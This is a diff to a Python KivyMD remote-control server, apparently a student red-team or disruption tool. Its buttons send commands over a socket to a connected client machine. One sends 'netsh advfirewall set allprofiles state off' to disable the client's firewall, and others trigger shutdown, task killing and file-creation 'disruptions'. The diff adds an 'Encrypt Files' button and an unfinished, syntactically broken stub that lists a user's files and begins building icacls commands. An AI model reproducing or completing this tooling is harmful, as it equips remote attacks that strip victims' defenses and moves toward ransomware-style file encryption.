@@ -20,6 +20,7 @@ ScreenManager:
             opacity: 1
             disabled: False
             on_press: app.StartServer()
+            
         MDLabel:
             id: statusLbl
             text: "Status"
@@ -28,14 +29,21 @@ ScreenManager:
             size_hint_y: None
             height: self.texture_size[1]
             padding_y: "500"
+            
     MDScreen:
-        name: "mainMenu"          
+        name: "mainMenu"
+        MDTextField:
+            id: consoleField
+            hint_text: Console
+            multiline: True
+            
         MDGridLayout:
             adaptive_height: True
             pos_hint: {"center_x": 0.6, "center_y": 0.8}
             orientation: 'lr-tb'
             spacing: 10
             cols: 2
+            
             MDRectangleFlatButton:
                 id: networkInfoBtn
                 text: "Network Info"
@@ -43,6 +51,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.NetworkInfo()
+                
             MDRectangleFlatButton:
                 id: cpuBtn
                 text: "CPU Usage"
@@ -50,6 +59,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.CpuUsage()
+                
             MDRectangleFlatButton:
                 id: taskBtn
                 text: "Task List"
@@ -57,6 +67,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Tasks()
+                
             MDRectangleFlatButton:
                 id: netserviceBtn
                 text: "Network Services"
@@ -64,6 +75,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Services()
+                
             MDRectangleFlatButton:
                 id: userInfoBtn
                 text: "User Information"
@@ -71,6 +83,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.UserInfo()
+                
             MDRectangleFlatButton:
                 id: fileCreateBtn
                 text: "File Creation Disruption"
@@ -78,6 +91,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.FileCreate()
+                
             MDRectangleFlatButton:
                 id: firewallBtn
                 text: "Firewall"
@@ -85,6 +99,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Firewall()
+                
             MDRectangleFlatButton:
                 id: shutDownBtn
                 text: "Shutdown"
@@ -92,6 +107,7 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.Shutdown()
+                
             MDRectangleFlatButton:
                 id: killTaskBtn
                 text: "Kill Task"
@@ -99,6 +115,14 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.KillTask()
+                
+            MDRectangleFlatButton:
+                id: encrFileBtn
+                text: "Encrypt Files"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.EncryptFiles()
 '''
 
 class Main(MDApp):
@@ -207,8 +231,8 @@ class Main(MDApp):
             break
 
     ###############################DISRUPTIONS############################################
+    #Juls Simple Disruption
     #Disable Firewall Disruption
-    #Juls Simp
     def Firewall(self):
         while True:
             command = "netsh advfirewall set allprofiles state off"
@@ -218,7 +242,23 @@ class Main(MDApp):
             print(f"Output: {output}")
             break
 
-    #Zees Sev
+##    def EncryptFiles(self):
+##        while True:
+##            command = 'cd C:\\Users\\%USERNAME%\\Desktop\\Test'
+##            self.currConn.send(command.encode())
+##            print('Command sent to client: ', command)
+##            
+##            command = 'dir'
+##            self.currConn.send(command.encode())
+##            print('Command sent to client: ', command)
+##            output = self.currConn.recv(8096).decode()
+##            print('Output: ', output)
+##
+##            for(i in output):
+##                print(i)
+##                command = 'icacls ' + i 
+
+    #Zees Severe Disruption
     # File Creation Disruption
     def FileCreate(self):
         while True:
@@ -227,7 +267,7 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             break
 
-    #Zees Simp
+    #Zees Simple Disruptions
     #Shutdown Disruption
     def Shutdown(self):
         while True:
